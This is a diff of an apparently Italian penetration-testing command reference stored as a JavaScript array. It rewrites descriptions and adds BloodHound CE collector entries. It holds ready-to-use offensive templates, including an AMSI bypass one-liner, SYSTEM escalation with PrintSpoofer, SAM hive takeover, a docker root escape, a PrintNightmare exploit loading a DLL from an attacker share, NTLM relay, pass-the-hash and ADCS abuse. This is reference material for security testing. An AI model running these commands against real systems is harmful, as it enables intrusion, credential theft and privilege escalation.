-    "description": "Confronta versione kernel e pacchetti con un DB di exploit noti. Da incrociare sempre col risultato di LinPEAS.",
+    "description": "Confronta la versione del kernel e dei pacchetti installati con un database di exploit noti, producendo una lista ordinata per probabilità di successo. I risultati vanno sempre incrociati con l'output di LinPEAS e verificati, perché molti sono falsi positivi legati a backport di sicurezza che correggono la falla senza cambiare il numero di versione.",
     "platform": "linux",
     "requires": [
       "shell"
@@ -7537,7 +7766,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "auto-enum",
     "group": "Windows",
-    "description": "Equivalente Windows di LinPEAS: servizi, permessi, credenziali salvate, token privileges, AlwaysInstallElevated.",
+    "description": "Enumerazione automatica per Windows, equivalente di LinPEAS: setaccia servizi, permessi deboli, credenziali salvate, privilegi del token e AlwaysInstallElevated, evidenziando in rosso i vettori più promettenti. Su un target con EDR attivo il binario viene spesso segnalato, e conviene ripiegare su Seatbelt o sui comandi manuali.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -7557,7 +7786,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "auto-enum",
     "group": "Windows",
-    "description": "Raccoglie decine di check di sicurezza host (token, UAC, servizi, credenziali). `-group=all` esegue tutto.",
+    "description": "Raccoglie decine di controlli di sicurezza sull'host Windows in un'unica passata: privilegi del token, stato UAC, configurazione dei servizi, credenziali salvate, cronologia dei browser e altro. Rispetto a WinPEAS l'output è organizzato per categoria, più leggibile quando serve solo un'area. `-group=all` esegue ogni check disponibile.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -7576,7 +7805,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "auto-enum",
     "group": "Windows",
-    "description": "Cerca misconfiguration sfruttabili: servizi con permessi deboli, unquoted path, AlwaysInstallElevated.",
+    "description": "Cerca le misconfigurazioni di Windows che portano a escalation locale: servizi con permessi deboli, binari modificabili, unquoted service path e AlwaysInstallElevated. Per ogni problema trovato indica già la funzione di abuso da richiamare. Gira in memoria via PowerShell, il che riduce le tracce su disco ma resta rilevabile dai controlli su AMSI.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -7610,7 +7839,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "auto-enum",
     "group": "Windows",
-    "description": "Confronta `systeminfo` con i bollettini Microsoft per trovare patch mancanti. Gira in locale sull’output salvato.",
+    "description": "Windows Exploit Suggester confronta l'output di `systeminfo`, quindi versione, build e hotfix installati, con il database dei bollettini Microsoft per elencare le vulnerabilità kernel non corrette. Gira in locale sull'output salvato, senza toccare il target. La lista va filtrata tenendo solo gli exploit con codice pubblico affidabile, perché molti risultati sono soltanto teorici.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -7630,7 +7859,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "sudo",
     "group": "Linux",
-    "description": "Mostra cosa puoi eseguire via `sudo`. Per ogni binario `NOPASSWD` cerca l’escape su GTFOBins.",
+    "description": "Mostra quali comandi l'utente corrente può eseguire via `sudo`. Per ogni binario marcato `NOPASSWD` l'escape corrispondente si cerca su GTFOBins.",
     "platform": "linux",
     "requires": [
       "shell"
@@ -7735,7 +7964,7 @@ const COMMANDS = [
         "id": "soinject",
         "label": "SO injection",
         "template": "strace <binary> 2>&1 | grep \"No such file\"",
-        "description": "Se il SUID carica una `.so` mancante: crea tu quella libreria con payload."
+        "description": "Quando il binario SUID carica una `.so` mancante, quella libreria va creata con il payload al suo interno."
       }
     ]
   },
@@ -7745,7 +7974,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "capabilities",
     "group": "Linux",
-    "description": "Elenca i file con capabilities e i loro poteri speciali. Da controllare:\n- `cap_setuid` = imposti UID 0, diventi root\n- `cap_dac_read_search` = leggi qualsiasi file, bypassa i permessi (es. `/etc/shadow`)\n- `cap_net_bind_service` = bind su porte < 1024",
+    "description": "Elenca i file con capabilities e i poteri speciali che ne derivano. Da controllare in particolare:\n- `cap_setuid` = consente di impostare UID 0 e diventare root\n- `cap_dac_read_search` = consente la lettura di qualsiasi file bypassando i permessi, per esempio `/etc/shadow`\n- `cap_net_bind_service` = consente il bind su porte inferiori a 1024",
     "platform": "linux",
     "requires": [
       "shell"
@@ -7764,7 +7993,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "capabilities",
     "group": "Linux",
-    "description": "Se un binario (es. `python3`) ha `cap_setuid+ep`, imposta UID 0 ed esegui una shell.",
+    "description": "Un binario con `cap_setuid+ep`, per esempio `python3`, permette di impostare UID 0 e aprire una shell di root.",
     "platform": "linux",
     "requires": [
       "shell"
@@ -7783,7 +8012,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "cron-tasks",
     "group": "Linux",
-    "description": "Elenca cron job e timer. Se un job gira come root ed esegue uno script scrivibile o usa una wildcard, puoi iniettare comandi.",
+    "description": "Elenca cron job e timer. Un job che gira come root ed esegue uno script scrivibile, o che usa una wildcard, apre all'iniezione di comandi.",
     "platform": "linux",
     "requires": [
       "shell"
@@ -7833,7 +8062,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "cron-tasks",
     "group": "Windows",
-    "description": "Elenca i task pianificati e cerca quelli che eseguono script/binari scrivibili dal tuo utente: sovrascrivili col payload.",
+    "description": "Elenca i task pianificati. Quelli che eseguono script o binari scrivibili dall'utente corrente si sovrascrivono con il payload.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -7871,7 +8100,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "token-priv",
     "group": "Windows",
-    "description": "Con `SeImpersonatePrivilege` (tipico di service account, IIS, MSSQL) abusi un named pipe per ottenere SYSTEM. Scegli il tool in base alla versione di Windows.",
+    "description": "`SeImpersonatePrivilege`, tipico di service account, IIS e MSSQL, consente di abusare di un named pipe per ottenere SYSTEM. Il tool si sceglie in base alla versione di Windows.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -7889,7 +8118,7 @@ const COMMANDS = [
         "id": "default",
         "label": "PrintSpoofer",
         "template": ".\\PrintSpoofer64.exe -i -c powershell",
-        "description": "Windows 10 / Server 2016-2019. `-i` shell interattiva."
+        "description": "Windows 10 e 11, Server 2016-2022. È la scelta corretta proprio dove JuicyPotato non funziona più, cioè da Server 2019 e Windows 10 1809 in poi. `-i` apre una shell interattiva."
       },
       {
         "id": "godpotato",
@@ -7911,7 +8140,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "token-priv",
     "group": "Windows",
-    "description": "Con `SeBackupPrivilege` copi file protetti (SAM/SYSTEM, NTDS); con `SeTakeOwnershipPrivilege` prendi possesso di un file e ti concedi i permessi.",
+    "description": "`SeBackupPrivilege` consente la copia di file protetti come SAM, SYSTEM e NTDS, mentre `SeTakeOwnershipPrivilege` consente di prendere possesso di un file e di assegnarsi i permessi.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -7941,7 +8170,7 @@ const COMMANDS = [
         "id": "takeown",
         "label": "SeTakeOwnership",
         "template": "takeown /f C:\\Windows\\System32\\config\\SAM & icacls C:\\Windows\\System32\\config\\SAM /grant <user>:F",
-        "description": "Prendi ownership del file e concediti Full Control."
+        "description": "Assegna la proprietà del file all'account corrente, che poi si concede il Full Control."
       }
     ]
   },
@@ -8016,7 +8245,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "priv-groups",
     "group": "Windows",
-    "description": "Il gruppo `Server Operators` può modificare i servizi: ripunta il binPath di un servizio (es. `AppReadiness`) sul tuo payload e riavvialo.",
+    "description": "Il gruppo `Server Operators` può modificare i servizi: il binPath di un servizio, per esempio `AppReadiness`, viene ripuntato sul payload e il servizio riavviato.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -8059,7 +8288,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Unquoted path",
         "template": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\"",
-        "description": "Se il path ha spazi e non è tra virgolette (es. `C:\\Program Files\\My App\\svc.exe`), piazza `C:\\Program.exe`."
+        "description": "Un path con spazi e non racchiuso fra virgolette, per esempio `C:\\Program Files\\My App\\svc.exe`, consente di collocare `C:\\Program.exe`."
       },
       {
         "id": "accesschk",
@@ -8071,7 +8300,7 @@ const COMMANDS = [
         "id": "writable",
         "label": "Binario scrivibile",
         "template": "icacls \"C:\\path\\to\\service.exe\"",
-        "description": "Se hai `(M)`/`(F)` sull’exe: sovrascrivilo col payload."
+        "description": "Un permesso `(M)` o `(F)` sull'eseguibile consente di sovrascriverlo con il payload."
       }
     ]
   },
@@ -8081,7 +8310,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "aie",
     "group": "Windows",
-    "description": "Se entrambe le chiavi `AlwaysInstallElevated` valgono `0x1`, ogni `.msi` viene installato come SYSTEM: genera un MSI malevolo ed eseguilo.",
+    "description": "Se entrambe le chiavi `AlwaysInstallElevated` valgono `0x1`, ogni `.msi` viene installato come SYSTEM: basta generare un MSI malevolo ed eseguirlo.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -8257,7 +8486,7 @@ const COMMANDS = [
         "id": "printnightmare",
         "label": "PrintNightmare",
         "template": "python3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\shell.dll'",
-        "description": "`CVE-2021-1675`/`34527`. Verifica spooler: `rpcdump.py @<ip> | egrep \"MS-RPRN|MS-PAR\"`. Ospita la DLL su SMB."
+        "description": "`CVE-2021-1675` e `CVE-2021-34527`. Lo spooler si verifica con `rpcdump.py @<ip> | egrep \"MS-RPRN|MS-PAR\"`. La DLL va ospitata su una share SMB."
       }
     ]
   },
@@ -8267,7 +8496,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "container-escape",
     "group": "Linux",
-    "description": "Se sei nel gruppo `docker` o `lxd` puoi montare il filesystem host dentro un container privilegiato e diventare root.",
+    "description": "L'appartenenza al gruppo `docker` o `lxd` consente di montare il filesystem dell'host dentro un container privilegiato e di ottenere root.",
     "platform": "linux",
     "requires": [
       "shell"
@@ -8285,7 +8514,7 @@ const COMMANDS = [
         "id": "default",
         "label": "docker",
         "template": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
-        "description": "Monta `/` host nel container e fai `chroot`."
+        "description": "Monta la `/` dell'host nel container ed esegue `chroot`."
       },
       {
         "id": "lxd",
@@ -8397,26 +8626,28 @@ const COMMANDS = [
         "id": "amsi",
         "label": "AMSI bypass",
         "template": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
-        "description": "Eseguilo PRIMA di caricare gli script PowerShell."
+        "description": "Va eseguito PRIMA di caricare gli script PowerShell."
       },
       {
         "id": "krb5",
         "label": "Kerberos (NTLM off)",
         "template": "nxc smb <ip> -u <user> -p <password> -k --generate-krb5-file /etc/krb5.conf",
-        "description": "Genera `krb5.conf` (FQDN del DC deve risolvere; sincronizza l’orologio col DC)."
+        "description": "Genera `krb5.conf`. L'FQDN del DC deve risolvere e l'orologio va sincronizzato con quello del domain controller."
       }
     ]
   },
   {
     "id": "bloodhound-py",
-    "name": "bloodhound.py — collect completo",
+    "name": "bloodhound — collect completo",
     "category": "active-directory",
     "subcategory": "enumeration",
     "group": "BloodHound",
-    "description": "Raccoglie da Linux tutti i dati per BloodHound. `-c all` usa ogni metodo di raccolta; `--zip` crea l’archivio da importare.",
+    "description": "Raccoglie da Linux tutti i dati AD per BloodHound CE, incluse le ACL attribute-level (`ReadLAPSPassword`, `ForceChangePassword`). `-c All` usa ogni metodo di raccolta (tranne LoggedOn); `--zip` crea l'archivio da importare. Su Kali il pacchetto CE è `bloodhound-ce-python`: il vecchio `bloodhound-python` (legacy) produce JSON che BHCE può rifiutare all'import.",
     "platform": "linux",
     "requires": [
-      "password"
+      "password",
+      "hash",
+      "ticket"
     ],
     "protocols": [
       "ldap",
@@ -8424,9 +8655,10 @@ const COMMANDS = [
     ],
     "tags": [
       "bloodhound",
-      "collector"
+      "collector",
+      "ce"
     ],
-    "template": "bloodhound-python -u <user> -p <password> -d <domain> -ns <ip> -c all --zip",
+    "template": "bloodhound-ce-python -u '<user>' -p '<password>' -d <domain> -ns <ip> -c All --zip",
     "params": [
       {
         "key": "user",
@@ -8451,8 +8683,178 @@ const COMMANDS = [
         "label": "DC IP",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "hash",
+        "label": "NT hash",
+        "ctx": "hash",
+        "placeholder": "aad3b...:<nt>"
+      },
+      {
+        "key": "dc_fqdn",
+        "label": "DC FQDN",
+        "placeholder": "DC01.corp.local"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Password",
+        "template": "bloodhound-ce-python -u '<user>' -p '<password>' -d <domain> -ns <ip> -c All --zip",
+        "description": "Raccolta completa via NTLM/LDAP. `-ns` = il DC come name server."
+      },
+      {
+        "id": "kerberos",
+        "label": "Kerberos (NTLM off)",
+        "template": "bloodhound-ce-python -u '<user>' -p '<password>' -d <domain> -ns <ip> -c All --zip --auth-method kerberos",
+        "description": "Se NTLM è disabilitato: forza Kerberos. L'FQDN del DC deve risolvere e l'orologio va sincronizzato col DC."
+      },
+      {
+        "id": "ccache",
+        "label": "Da ccache",
+        "template": "bloodhound-ce-python -u '<user>' -k -no-pass -d <domain> -ns <ip> -c All --zip --auth-method kerberos",
+        "description": "Riusa un TGT già ottenuto (`export KRB5CCNAME=<user>.ccache`). Nessuna password richiesta."
+      },
+      {
+        "id": "pth",
+        "label": "Pass-the-Hash",
+        "template": "bloodhound-ce-python -u '<user>' --hashes :<hash> -d <domain> -ns <ip> -c All --zip",
+        "description": "Autentica con l'NT hash (LM vuoto): `--hashes :<nt>`."
+      },
+      {
+        "id": "dnsfix",
+        "label": "Fix DNS",
+        "template": "bloodhound-ce-python -u '<user>' -p '<password>' -d <domain> -ns <ip> -c All --zip --dns-tcp --dns-timeout 30 -dc <dc_fqdn>",
+        "description": "Zip vuoto o pochi oggetti = DNS. Forza TCP, alza il timeout e indica il DC per hostname con `-dc`."
+      }
+    ],
+    "refs": [
+      {
+        "label": "bloodhound-ce-python — Kali Tools",
+        "url": "https://www.kali.org/tools/bloodhound-ce-python/"
+      }
+    ],
+    "note": "# Logica del collector\nImporta **tutti gli zip** insieme (bloodhound-ce-python + rusthound-ce + SharpHound): BHCE fa il merge automatico senza duplicati. Marca gli account compromessi come *Owned* per abilitare i path dai principal posseduti.\n# Query da lanciare sempre\n- `Shortest Path to Domain Admins` e `Shortest Paths from Owned objects` (dopo aver marcato gli owned)\n- `Find Kerberoastable Users` / `Find AS-REP Roastable Users`\n- ACL pericolose: `GenericAll`, `WriteDacl`, `WriteOwner`, `ForceChangePassword`\n- Chi può leggere le password LAPS (`ReadLAPSPassword`) ← catturato solo da bloodhound-ce-python, non da rusthound-ce"
+  },
+  {
+    "id": "rusthound-ce",
+    "name": "rusthound-ce — collector veloce",
+    "category": "active-directory",
+    "subcategory": "enumeration",
+    "group": "BloodHound",
+    "description": "Collector in Rust per BloodHound CE, molto più veloce su domini grandi. `-c All` esegue richieste LDAP, SMB e HTTP. Non cattura `ReadLAPSPassword` né `ForceChangePassword` sui gruppi, quindi va usato INSIEME a bloodhound-ce-python importando poi entrambi gli zip.",
+    "platform": "linux",
+    "requires": [
+      "password",
+      "ticket"
+    ],
+    "protocols": [
+      "ldap",
+      "smb"
+    ],
+    "tags": [
+      "rusthound",
+      "bloodhound",
+      "collector",
+      "rust"
+    ],
+    "template": "rusthound-ce -d <domain> -u '<user>@<domain>' -p '<password>' -i <ip> -f <dc_fqdn> -n <ip> -c All -z",
+    "params": [
+      {
+        "key": "domain",
+        "label": "Domain",
+        "ctx": "domain",
+        "placeholder": "corp.local"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      },
+      {
+        "key": "ip",
+        "label": "DC IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "dc_fqdn",
+        "label": "DC FQDN",
+        "placeholder": "DC01.corp.local"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Password",
+        "template": "rusthound-ce -d <domain> -u '<user>@<domain>' -p '<password>' -i <ip> -f <dc_fqdn> -n <ip> -c All -z",
+        "description": "`-i` IP del DC, `-f` FQDN del DC, `-n` name server (il DC stesso), `-z` zip."
+      },
+      {
+        "id": "kerberos",
+        "label": "Kerberos (-k)",
+        "template": "rusthound-ce -d <domain> -u '<user>@<domain>' -i <ip> -f <dc_fqdn> -n <ip> -c All -z -k",
+        "description": "Usa un TGT dal ccache tramite `KRB5CCNAME`. rusthound-ce non supporta il Pass-the-Hash: per quello serve bloodhound-ce-python."
+      }
+    ],
+    "refs": [
+      {
+        "label": "RustHound-CE — HELP.md",
+        "url": "https://github.com/g0h4n/RustHound-CE/blob/main/HELP.md"
       }
     ]
+  },
+  {
+    "id": "sharphound",
+    "name": "SharpHound — da Windows (sessioni attive)",
+    "category": "active-directory",
+    "subcategory": "enumeration",
+    "group": "BloodHound",
+    "description": "Collector .NET eseguito da un host Windows del dominio: unico affidabile per le **sessioni utente attive** (chi è loggato dove). Gira nel contesto dell'utente corrente. `-c All` raccoglie tutto; per le sole sessioni usa il loop, che ripete la raccolta e rigenera lo zip a ogni ciclo.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "ldap",
+      "smb"
+    ],
+    "tags": [
+      "sharphound",
+      "bloodhound",
+      "collector",
+      "sessions"
+    ],
+    "template": ".\\SharpHound.exe -c All --zipfilename bh.zip",
+    "params": [],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Collect All",
+        "template": ".\\SharpHound.exe -c All --zipfilename bh.zip",
+        "description": "Raccolta completa incluse le sessioni attive nel momento dell'esecuzione."
+      },
+      {
+        "id": "loop",
+        "label": "Session loop",
+        "template": ".\\SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:05:00",
+        "description": "Solo sessioni, per 2h ogni 5min: cattura chi si logga nel tempo. Uno zip per ciclo, molto rumoroso 🚩."
+      }
+    ],
+    "refs": [
+      {
+        "label": "SharpHound CE — SpecterOps",
+        "url": "https://bloodhound.specterops.io/collect-data/ce-collection/sharphound"
+      }
+    ],
+    "note": "# Da dove si lancia\nSharpHound va eseguito su una macchina Windows del dominio, nel contesto di un utente valido, cioè dopo il foothold. Non serve passare credenziali perché usa l'autenticazione integrata dell'host. `SharpHound.exe` va trasferito sul target e lanciato da lì."
   },
   {
     "id": "nxc-ad-enum",
@@ -8636,7 +9038,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "enumeration",
     "group": "Recycle Bin",
-    "description": "Enumera e ripristina gli account eliminati. Serve quando un template ADCS mostra Enrollment Rights per un SID senza nome (account cancellato): lo ripristini e sblocchi il path. Il restore richiede il diritto `DS-Reanimate-Tombstones`.",
+    "description": "Enumera e ripristina gli account eliminati. Serve quando un template ADCS mostra Enrollment Rights per un SID senza nome, cioè un account cancellato: ripristinandolo il path torna percorribile. Il restore richiede il diritto `DS-Reanimate-Tombstones`.",
     "platform": "cross-platform",
     "requires": [
       "password"
@@ -8686,7 +9088,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Linux (bloodyAD)",
         "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable --include-del\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set restore <target>",
-        "description": "Trovi gli oggetti eliminati, poi ripristini il target: recupera tutti i suoi gruppi e permessi."
+        "description": "Individua gli oggetti eliminati e ripristina il target, recuperandone tutti i gruppi e i permessi."
       },
       {
         "id": "windows",
@@ -8708,7 +9110,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "enumeration",
     "group": "User Enumeration",
-    "description": "Valida gli username via Kerberos senza bloccare account: non genera eventi `4625` (pre-auth probe).",
+    "description": "Valida gli username interrogando Kerberos con AS-REQ senza pre-autenticazione: il DC risponde in modo diverso per gli utenti esistenti e per quelli inventati, e la sonda non genera l'evento di logon fallito 4625. È quindi il modo più discreto per ripulire una lista di nomi prima di uno spray, e non consuma tentativi verso la soglia di lockout.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -8747,7 +9149,8 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "initial-access",
     "group": "Poisoning",
-    "description": "Avvelena le query LLMNR/NBT-NS/MDNS e cattura i NetNTLMv2 di chi cerca host inesistenti. Hash in `/usr/share/responder/logs/`, crack con hashcat `-m 5600`.",
+    "description": "Avvelena le query di risoluzione nomi LLMNR, NBT-NS e MDNS, protocolli di fallback attivi di default su Windows: quando un host cerca un nome inesistente, Responder risponde spacciandosi per quel nome e cattura il NetNTLMv2 di chi tenta di autenticarsi. Gli hash finiscono in `/usr/share/responder/logs/` e si craccano con hashcat in mode 5600.",
+    "note": "# Cattura o relay, non entrambi\nPer usare gli hash in un relay con ntlmrelayx, i server SMB e HTTP di Responder vanno disabilitati in `/etc/responder/Responder.conf`, altrimenti Responder intercetta la connessione destinata al relay.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -8795,7 +9198,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "initial-access",
     "group": "NTLM Relay",
-    "description": "Rilancia l’auth NTLM catturata verso host SENZA SMB signing (`nxc smb <range> --gen-relay-list`). `-i` apre una shell SMB interattiva, `-c` esegue un comando.",
+    "description": "Rilancia l'autenticazione NTLM catturata verso host che non impongono l'SMB signing, gli unici bersagli validi, ottenuti con `nxc smb <range> --gen-relay-list`. Senza toccare alcun hash, l'autenticazione della vittima viene spesa in tempo reale sul target: `-i` apre una shell SMB interattiva, `-c` esegue un comando singolo.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -8832,7 +9235,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "initial-access",
     "group": "AS-REP Roasting",
-    "description": "Richiede gli AS-REP degli utenti senza pre-auth Kerberos. Crack con hashcat `-m 18200`. Senza credenziali serve una lista di username.",
+    "description": "Preleva gli AS-REP degli account che hanno la pre-autenticazione Kerberos disabilitata, un'opzione lasciata spesso su account di servizio legacy. L'hash risultante si cracca offline con hashcat in mode 18200. Senza credenziali serve una lista di username, che si ottiene con kerbrute; con credenziali valide GetNPUsers li enumera da solo.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -8871,7 +9274,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "initial-access",
     "group": "Kerberoasting",
-    "description": "Richiede i TGS di tutti gli account con SPN configurato. Crack con hashcat `-m 13100`. Gli account di servizio hanno spesso password deboli.",
+    "description": "Kerberoasting: richiede i TGS di tutti gli account con un SPN registrato, che qualsiasi utente autenticato può ottenere. Gli account di servizio hanno spesso password deboli e mai scadute, quindi l'hash risultante, craccabile offline con hashcat in mode 13100, cade con frequenza sorprendente. Richiede una qualsiasi credenziale di dominio valida.",
     "platform": "linux",
     "requires": [
       "password"
@@ -8984,7 +9387,7 @@ const COMMANDS = [
         "id": "addmember",
         "label": "AddMember",
         "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add groupMember '<group>' <target>",
-        "description": "Aggiunge un utente a un gruppo su cui hai `AddMember`/`GenericAll`."
+        "description": "Aggiunge un utente a un gruppo sul quale si dispone di `AddMember` o `GenericAll`."
       }
     ]
   },
@@ -8994,7 +9397,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ACL Abuse",
-    "description": "Con `WriteOwner` su un oggetto ti imposti come suo owner, poi da owner ti concedi `GenericAll` e lo sfrutti come un normale ACL abuse (reset password, aggiunta a gruppo). Ricorda il cleanup finale.",
+    "description": "`WriteOwner` su un oggetto consente di diventarne owner e, da owner, di concedersi `GenericAll`, sfruttandolo poi come un normale ACL abuse con reset password o aggiunta a gruppo. Il cleanup finale è obbligatorio.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9044,13 +9447,13 @@ const COMMANDS = [
         "id": "default",
         "label": "bloodyAD",
         "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>\n\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add genericAll <target> <user>",
-        "description": "Diventi owner del target, poi ti concedi `GenericAll`. Da lì lo abusi come un normale ACL (reset password, add member)."
+        "description": "Assegna la proprietà del target all'account controllato, che poi si concede `GenericAll`. Da lì l'abuso procede come un normale ACL, con reset password o aggiunta a gruppo."
       },
       {
         "id": "impacket",
         "label": "owneredit + dacledit",
         "template": "owneredit.py -action write -new-owner <user> -target <target> '<domain>/<user>:<password>'\ndacledit.py -action write -rights FullControl -principal <user> -target <target> '<domain>/<user>:<password>'",
-        "description": "Cambi owner con `owneredit.py`, poi ti concedi FullControl con `dacledit.py`."
+        "description": "Cambia owner con `owneredit.py`, poi assegna FullControl con `dacledit.py`."
       }
     ],
     "refs": [
@@ -9117,13 +9520,13 @@ const COMMANDS = [
         "id": "default",
         "label": "Automatico",
         "template": "targetedKerberoast.py -d <domain> -u <user> -p '<password>' --dc-ip <ip>",
-        "description": "Aggiunge un SPN a ogni utente su cui hai scrittura, dumpa i TGS e rimuove l'SPN. `--request-user <target>` per un solo utente."
+        "description": "Aggiunge un SPN a ogni utente su cui si dispone di permessi di scrittura, preleva i TGS e rimuove l'SPN. `--request-user <target>` restringe l'operazione a un solo utente."
       },
       {
         "id": "manual",
         "label": "Manuale (bloodyAD)",
         "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName -v 'fake/spn'\nimpacket-GetUserSPNs <domain>/<user>:'<password>' -dc-ip <ip> -request-user <target>\n# cleanup: rimuovi lo SPN\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName",
-        "description": "Aggiungi l'SPN fittizio, richiedi il TGS, poi rimuovi l'SPN. Crack con hashcat `-m 13100`."
+        "description": "L'SPN fittizio va aggiunto, il TGS richiesto e l'SPN poi rimosso. Il crack avviene con hashcat in mode `-m 13100`."
       }
     ],
     "refs": [
@@ -9212,7 +9615,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ADCS — Recon",
-    "description": "Enumera CA e template ADCS segnalando i vulnerabili (`ESC1`-`ESC15`). `-vulnerable -stdout` per il riepilogo rapido.",
+    "description": "Enumera le Certificate Authority e i template ADCS del dominio, segnalando quelli vulnerabili alle misconfigurazioni note da ESC1 a ESC15. `-vulnerable -stdout` produce un riepilogo rapido a schermo, mentre senza filtri genera un report completo in BloodHound e testo. È il punto di partenza obbligato di ogni attacco ADCS.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9270,7 +9673,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ADCS — ESC1",
-    "description": "Su un template vulnerabile a ESC1, richiede un certificato con SAN arbitrario (`-upn administrator@...`): poi ti autentichi come quell’utente.",
+    "description": "Su un template vulnerabile a ESC1 richiede un certificato indicando un SAN arbitrario con `-upn administrator@dominio`: la CA lo emette senza verificare che il richiedente sia davvero quell'utente. Il certificato risultante permette poi di autenticarsi come l'utente impersonato via PKINIT, quindi di ottenerne TGT e NT hash.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9332,7 +9735,8 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ADCS — ESC1",
-    "description": "PKINIT col `.pfx` ottenuto: restituisce un TGT e l’NT hash dell’utente impersonato (via U2U).",
+    "description": "Completa la catena ADCS: dato il certificato `.pfx` ottenuto per l'utente bersaglio, esegue l'autenticazione PKINIT e restituisce un TGT valido più l'NT hash dell'utente, ricavato tramite U2U. Da lì l'hash apre il Pass-the-Hash e il TGT il Pass-the-Ticket.",
+    "note": "# Errore di clock skew\nPKINIT è sensibile alla differenza di orario con il domain controller. `KRB_AP_ERR_SKEW` si risolve sincronizzando l'orologio con `ntpdate <dc>` oppure `faketime`.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -9365,7 +9769,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "ADCS — ESC8",
-    "description": "Rilancia l’auth NTLM forzata verso l’endpoint web ADCS (`/certsrv`) ed emette un certificato a nome della vittima (ESC8). Da combinare con `coercer`.",
+    "description": "Rilancia l'autenticazione NTLM forzata verso l'endpoint web di ADCS su `/certsrv` e richiede un certificato a nome della vittima, che è tipicamente il computer account di un domain controller (ESC8). Il certificato ottenuto si converte poi in un TGT con certipy. Va combinato con una coercizione, per esempio via coercer, che fornisca l'autenticazione da rilanciare.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -9395,7 +9799,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Coercion",
-    "description": "PetitPotam / MS-RPRN / DFSCoerce: forza un computer (DC) ad autenticarsi verso il tuo listener. Combinalo con un relay verso ADCS o LDAP.",
+    "description": "Costringe un computer, tipicamente un domain controller, ad autenticarsi verso il listener dell'attaccante sfruttando funzioni RPC che richiamano un percorso UNC, come PetitPotam via MS-EFSR, il bug dello spooler MS-RPRN o DFSCoerce. L'autenticazione forzata va poi rilanciata in relay verso ADCS o LDAP, oppure catturata su una macchina con delega non vincolata.",
     "platform": "linux",
     "requires": [
       "password"
@@ -9447,7 +9851,8 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "priv-esc",
     "group": "Delegation (RBCD)",
-    "description": "Sfrutta il `MachineAccountQuota` (default 10) per creare un computer account che controlli: prerequisito per RBCD.",
